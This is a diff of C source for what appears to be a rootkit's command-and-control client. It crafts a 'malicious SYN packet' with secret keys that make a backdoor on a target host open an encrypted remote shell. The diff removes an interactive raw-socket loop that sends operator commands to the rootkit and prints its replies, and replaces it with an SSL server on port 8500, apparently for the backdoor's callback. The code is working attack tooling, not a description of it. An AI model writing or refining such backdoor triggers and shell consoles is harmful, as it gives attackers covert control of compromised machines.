@@ -12,7 +12,6 @@
 
 #include "../common/constants.h"
 #include "../common/c&c.h"
-#include "../common/protocol.h"
 #include "include/sslserver.h"
 
 // For printing with colors
@@ -195,7 +194,7 @@ void activate_command_control_shell_encrypted(char* argv){
     check_ip_address_format(argv);
     printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
     //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
-    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1];
+    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1] = {0};
     srand(time(NULL));
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
         payload[ii] = (char)rand();
@@ -203,10 +202,10 @@ void activate_command_control_shell_encrypted(char* argv){
     //Follow protocol rules
     char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
-    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_1;
-    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_2;
+    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_1;
+    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_2;
     //K3 with command to start the encrypted connection with the backdoor
-    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
     char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
@@ -238,35 +237,10 @@ void activate_command_control_shell_encrypted(char* argv){
     }else{
         printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
     }
-    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
     
-    //Wait for rootkit ACK to ensure it's up
-    rawsocket_sniff_pattern(CC_PROT_ACK);
-    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
+    server_run(8500);
 
-    //Received ACK, we proceed to send command
-    while(1){
-        char buf[BUFSIZ];                                                                                                                                                          
-        printf(""KYLW"c>:"RESET"");                                                                                                                                                              
-        fgets(buf, BUFSIZ, stdin);
-        if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
-            buf[strlen(buf)-1] = '\0';   
-        }                                                                                                                                                                         
-        
-        char msg[BUFSIZ];
-        strcpy(msg, CC_PROT_MSG);
-        strcat(msg, buf);
-        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
-        printf("Sending %s\n", msg);
-        if(rawsocket_send(packet)<0){
-            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
-            return;
-        }
-        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
-        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
-        char* res = packet.payload;
-        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
-    }
+    
     
 }
 
